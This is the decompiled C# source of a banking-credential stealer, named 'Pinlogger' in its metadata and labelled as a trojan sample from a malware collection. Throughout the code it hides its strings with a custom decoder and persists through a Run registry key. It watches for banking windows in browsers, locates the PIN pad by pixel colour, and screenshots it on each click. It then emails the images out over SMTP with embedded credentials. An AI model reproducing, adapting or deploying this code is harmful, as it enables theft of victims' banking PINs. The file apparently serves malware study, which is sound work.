// Decompiled with JetBrains decompiler
// Type: Module1
// Assembly: Pinlogger, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 19FD89DE-6CB2-4C42-901E-08BB045A4F0A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Foreign.mwkj-e70cba1546b85d2a7eca0bef716fecb814fd62baf8383522d82b5a23456db8cd.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

[StandardModule]
internal sealed class Module1
{
  public static int PNNMBR = 0;
  public static bool STPSCN = false;
  public static string[] RSWNTIT = new string[6]
  {
    Module1.PCDEC2("uNba2NipwtzYBA==", "False"),
    Module1.PCDEC2("irC0taaUtGt/JQ==", "False"),
    Module1.PCDEC2("h6Odsagx", "False"),
    Module1.PCDEC2("rbfTzbyqyoHeDw==", "False"),
    Module1.PCDEC2("oMnHysiuyoLfDg==", "False"),
    Module1.PCDEC2("krGusrKKo7lspI6sKQ==", "False")
  };
  public static bool WINFND = false;
  public static bool FNDBNK = false;
  public static Point STRTLOC = new Point();
  public static string CLRCO1;
  public static string CLRCO2;
  public static Thread TITH = new Thread(new ThreadStart(Module1.FND));
  public static Thread WITHR = new Thread(new ThreadStart(Module1.SERWIN));
  public static Thread WITHR2 = new Thread(new ThreadStart(Module1.SERWIN2));
  public static Thread BATH = new Thread(new ThreadStart(Module1.SCNBNK));
  public static Thread SNDTH = new Thread(new ThreadStart(Module1.SNDCNFRM));
  public static string Em = Module1.PCDEC2("lcO/y7SYsZbEvJG0wouyn7gY", "False");
  public static string Ps = Module1.PCDEC2("lrLOyL9lf4uRGA==", "False");
  public static bool SE = false;
  public static string sm = Module1.PCDEC2("pbrMz3+ZurnIvWCwx8wY", "False");
  public static Rectangle BNDS = Screen.PrimaryScreen.Bounds;

  [STAThread]
  public static void Main()
  {
    try
    {
      Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Module1.PCDEC2("gJOvvrOAIw==", "False"));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Module1.PCDEC2("gJOvvrOAIw==", "False")))
        Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Module1.PCDEC2("gJOvvrOAIw==", "False"));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Module1.PCDEC2("eYWsra6Mq7KwsHmMqLesS527ry0=", "False"), true);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      string name = Module1.PCDEC2("hMXK0rWebJm/s5zBx36dkrq4xbWjFg==", "False");
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Module1.PCDEC2("eYWsra6Mq7KwsHmMqLesS527ry0=", "False");
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Module1.PCDEC2("a6Kkua55paOhhIGWsLSqh5myoY6BoaK0rouPgbqpipisuY19pbGupoaPkLqlLg==", "False"), true);
      registryKey.SetValue(name, (object) str);
      registryKey.Close();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      Module1.SNDTH.IsBackground = true;
      Module1.SNDTH.Start();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      Module1.WITHR.IsBackground = true;
      Module1.WITHR.Start();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      Process.GetCurrentProcess().WaitForExit();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static Module1.MDNME GETWNTXT()
  {
    StringBuilder LPWITE = new StringBuilder((int) byte.MaxValue);
    LPWITE.Length = Module1.GetWindowText(Module1.GetForegroundWindow(), LPWITE, checked (LPWITE.Capacity + 1));
    return new Module1.MDNME()
    {
      WRDS = LPWITE.ToString(),
      FRME = Module1.GetForegroundWindow()
    };
  }

  public static void SNDCNFRM()
  {
    int num1;
    try
    {
      if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Module1.PCDEC2("marY2A0=", "False")))
      {
        try
        {
          Module1.SNDTH.Abort();
        }
        catch (Exception ex)
        {
          int num2;
          int lErl = num2;
          ProjectData.SetProjectError(ex, lErl);
          ProjectData.ClearProjectError();
        }
      }
      else
      {
        int num3 = 0;
        while (true)
        {
          num1 = 1;
          try
          {
            MailMessage message = new MailMessage();
            MailMessage mailMessage = message;
            mailMessage.From = new MailAddress(Module1.Em);
            mailMessage.To.Add(Module1.Em);
            mailMessage.Subject = Module1.PCDEC2("i8PS1dKrv9jffo/D09jNpsHK3n6Sz8jPw7LNy+HKq9OFvr+terTamF8I", "False") + MyProject.Computer.Name + Module1.PCDEC2("WrbUoXkM", "False") + DateTime.Now.ToString();
            mailMessage.Body = Module1.PCDEC2("eKm6bLWIprFssISdqrW0hFqmbK6IqLG7pT+gt7urP66ttbE/nbS5rpSuqr5elqO5tKeNWnpsq4iousCjklq0sl6Toqq5XpOztbWshlq5tKOIrGW8p41oKQ==", "False");
            new SmtpClient(Module1.sm)
            {
              Port = 587,
              EnableSsl = true,
              Credentials = ((ICredentialsByHost) new NetworkCredential(Module1.Em, Module1.Ps))
            }.Send(message);
            try
            {
              System.IO.File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Module1.PCDEC2("marY2A0=", "False"));
              break;
            }
            catch (Exception ex)
            {
              int lErl = num1;
              ProjectData.SetProjectError(ex, lErl);
              ProjectData.ClearProjectError();
              break;
            }
          }
          catch (Exception ex1)
          {
            int lErl1 = num1;
            ProjectData.SetProjectError(ex1, lErl1);
            if (num3 == 3)
            {
              try
              {
                Module1.SNDTH.Abort();
                ProjectData.ClearProjectError();
                break;
              }
              catch (Exception ex2)
              {
                int lErl2 = num1;
                ProjectData.SetProjectError(ex2, lErl2);
                ProjectData.ClearProjectError();
              }
              ProjectData.ClearProjectError();
              break;
            }
            checked { ++num3; }
            ProjectData.ClearProjectError();
          }
        }
      }
    }
    catch (Exception ex)
    {
      int lErl = num1;
      ProjectData.SetProjectError(ex, lErl);
      ProjectData.ClearProjectError();
    }
  }

  [DllImport("user32.dll")]
  public static extern IntPtr GetForegroundWindow();

  [DllImport("user32.dll")]
  public static extern int GetWindowText(IntPtr HWD, StringBuilder LPWITE, int NMACO);

  public static void SERWIN()
  {
    while (true)
    {
      try
      {
        string[] rswntit = Module1.RSWNTIT;
        int index1 = 0;
        while (index1 < rswntit.Length)
        {
          string str = rswntit[index1];
          if (Module1.GETWNTXT().WRDS.ToLower().Contains(str))
          {
            Process[] processes = Process.GetProcesses();
            int index2 = 0;
            while (index2 < processes.Length)
            {
              Process process = processes[index2];
              if (Operators.CompareString(process.ProcessName.ToLower(), Module1.PCDEC2("qrzczgo=", "False"), false) == 0 | Operators.CompareString(process.ProcessName.ToLower(), Module1.PCDEC2("hZeorbKHl7a2nYObsy4=", "False"), false) == 0)
              {
                Module1.WINFND = true;
                Console.WriteLine("Window Found");
                Console.WriteLine("Scanning for bank");
                Module1.WITHR2.IsBackground = true;
                Module1.WITHR2.Start();
                Module1.BATH.IsBackground = true;
                Module1.BATH.Start();
                return;
              }
              checked { ++index2; }
            }
          }
          checked { ++index1; }
        }
        Thread.Sleep(100);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }

  public static void SERWIN2()
  {
    while (!Module1.STPSCN)
    {
      try
      {
        string[] rswntit = Module1.RSWNTIT;
        int index1 = 0;
        while (index1 < rswntit.Length)
        {
          string str = rswntit[index1];
          if (Module1.GETWNTXT().WRDS.ToLower().Contains(str))
          {
            Process[] processes = Process.GetProcesses();
            int index2 = 0;
            while (index2 < processes.Length)
            {
              Process process = processes[index2];
              if (Operators.CompareString(process.ProcessName.ToLower(), Module1.PCDEC2("qrzczgo=", "False"), false) == 0 | Operators.CompareString(process.ProcessName.ToLower(), Module1.PCDEC2("hZeorbKHl7a2nYObsy4=", "False"), false) == 0)
                Module1.WINFND = true;
              checked { ++index2; }
            }
          }
          else
            Module1.WINFND = false;
          checked { ++index1; }
        }
        Thread.Sleep(100);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }

  public static void SendEmail()
  {
    FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Module1.PCDEC2("gJOvvrOAIw==", "False")).GetFiles();
    Thread.Sleep(5000);
    Console.WriteLine("Sending");
    int num1 = 0;
    while (true)
    {
      int num2 = 2;
      try
      {
        MailMessage message = new MailMessage();
        MailMessage mailMessage = message;
        mailMessage.From = new MailAddress(Module1.Em);
        mailMessage.To.Add(Module1.Em);
        mailMessage.Subject = Module1.PCDEC2("Z5urZImLoamppDd4r7OjUVIx", "False") + MyProject.Computer.Name + Module1.PCDEC2("WrbUoXkM", "False") + DateTime.Now.ToString();
        mailMessage.Body = Module1.PCDEC2("f7i1d7mctLO8vJ1lv71pj7G5xLKYpsTAuJhlxMZpnKrEya6Tu7V3vZKqcMeymGW2ybiXZcS/rkq1ubq9n7e1yncc", "False");
        try
        {
          FileInfo[] fileInfoArray = files;
          int index = 0;
          while (index < fileInfoArray.Length)
          {
            Attachment attachment = new Attachment(fileInfoArray[index].FullName);
            mailMessage.Attachments.Add(attachment);
            checked { ++index; }
          }
        }
        catch (Exception ex)
        {
          int lErl = num2;
          ProjectData.SetProjectError(ex, lErl);
          int num3 = (int) MessageBox.Show(ex.Message);
          ProjectData.ClearProjectError();
        }
        new SmtpClient(Module1.sm)
        {
          Port = 587,
          EnableSsl = true,
          Credentials = ((ICredentialsByHost) new NetworkCredential(Module1.Em, Module1.Ps))
        }.Send(message);
        Console.WriteLine("Email Sent");
        Module1.AFTMTH();
        break;
      }
      catch (Exception ex)
      {
        int lErl = num2;
        ProjectData.SetProjectError(ex, lErl);
        if (num1 == 3)
        {
          Application.Restart();
          ProjectData.ClearProjectError();
          break;
        }
        checked { ++num1; }
        ProjectData.ClearProjectError();
      }
    }
  }

  public static void AFTMTH()
  {
    try
    {
      Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Module1.PCDEC2("eYWsra6Mq7KwsHmMqLesS527ry0=", "False"));
      ProjectData.EndApp();
      Application.Exit();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void FND()
  {
  }

  public static Rectangle SCBNDS
  {
    get => Module1.BNDS;
    set => Module1.BNDS = value;
  }

  public static void SCNBNK()
  {
    int num1 = 1;
    Rectangle rectangle;
    while (!Module1.FNDBNK)
    {
      try
      {
        Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
        int width = MyProject.Computer.Screen.Bounds.Width;
        rectangle = MyProject.Computer.Screen.Bounds;
        int height = rectangle.Height;
        Bitmap bitmap = new Bitmap(width, height);
        Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
        int num2 = checked (bitmap.Width - 1);
        int x = 100;
        while (x <= num2)
        {
          int num3 = checked (bitmap.Height - 1);
          int y = 100;
          while (y <= num3)
          {
            if (bitmap.GetPixel(x, y) == System.Drawing.Color.FromArgb(170, 130, 126) | bitmap.GetPixel(x, y) == System.Drawing.Color.FromArgb(169, 129, 126) | bitmap.GetPixel(x, y) == System.Drawing.Color.FromArgb(168, 128, 125) | bitmap.GetPixel(x, y) == System.Drawing.Color.FromArgb(171, 131, (int) sbyte.MaxValue))
            {
              Module1.CLRCO1 = x.ToString();
              Module1.CLRCO2 = y.ToString();
              Console.WriteLine("Bank Found");
              goto label_12;
            }
            else
              checked { y += 2; }
          }
          checked { x += 20; }
        }
        Thread.Sleep(15);
      }
      catch (Exception ex)
      {
        int lErl = num1;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
    }
label_12:
    Module1.STPSCN = true;
    Module1.STRTLOC = new Point(checked ((int) Math.Round(unchecked (Conversions.ToDouble(Module1.CLRCO1) - 50.0))), checked ((int) Math.Round(unchecked (Conversions.ToDouble(Module1.CLRCO2) - 90.0))));
    Console.WriteLine(Module1.CLRCO1 + "x" + Module1.CLRCO2);
    rectangle = new Rectangle(Module1.STRTLOC, new Size(545, 335));
    Module1.SCBNDS = rectangle;
    while (true)
    {
      try
      {
        while (Module1.PNNMBR <= 5)
        {
          if (Module1.GetAsyncKeyState(1) != (short) 0)
          {
            Console.WriteLine("Left Click");
            try
            {
              Bitmap bitmap = new Bitmap(Module1.BNDS.Width, Module1.BNDS.Height, PixelFormat.Format32bppArgb);
              Graphics.FromImage((Image) bitmap).CopyFromScreen(Module1.SCBNDS.X, Module1.SCBNDS.Y, 0, 0, Module1.SCBNDS.Size, CopyPixelOperation.SourceCopy);
              checked { ++Module1.PNNMBR; }
              bitmap.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Module1.PCDEC2("gJOvvrOAIw==", "False") + Module1.PNNMBR.ToString() + Module1.PCDEC2("VLG6uiQ=", "False"));
            }
            catch (Exception ex)
            {
              int lErl = num1;
              ProjectData.SetProjectError(ex, lErl);
              ProjectData.ClearProjectError();
            }
            Console.WriteLine("Pin #" + Module1.PNNMBR.ToString() + " Saved");
          }
          Thread.Sleep(100);
        }
        Module1.SendEmail();
        Console.WriteLine("Images Saved");
        break;
      }
      catch (Exception ex)
      {
        int lErl = num1;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
    }
  }

  [DllImport("user32.dll")]
  public static extern short GetAsyncKeyState(int vKey);

  [DllImport("user32.dll")]
  public static extern short GetAsyncKeyState(Keys vKey);

  public static string PCDEC2(string Input, string LTTRHIT)
  {
    string str;
    try
    {
      str = Encoding.UTF8.GetString(Module1.DD2(Convert.FromBase64String(Input), Encoding.UTF8.GetBytes(LTTRHIT)));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public static byte[] DD2(byte[] Input, byte[] LTTRHIT)
  {
    int num1 = (int) Input[checked (Input.Length - 1)];
    byte[] numArray1 = new byte[checked (Input.Length - 2 + 1)];
    short index1 = 0;
    byte[] numArray2;
    try
    {
      int num2 = checked (Input.Length - 2);
      int index2 = 0;
      while (index2 <= num2)
      {
        if ((int) index1 >= LTTRHIT.Length)
          index1 = (short) 0;
        if (index2 < checked (Input.Length - 1))
        {
          numArray1[index2] = Convert.ToByte(checked ((int) Input[index2] - unchecked (numArray1.Length % LTTRHIT.Length) - (int) LTTRHIT[(int) index1] + num1));
          checked { ++index1; }
        }
        checked { ++index2; }
      }
      numArray2 = numArray1;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      numArray2 = numArray1;
      ProjectData.ClearProjectError();
    }
    return numArray2;
  }

  public struct MDNME
  {
    public IntPtr FRME;
    public string WRDS;
  }
}
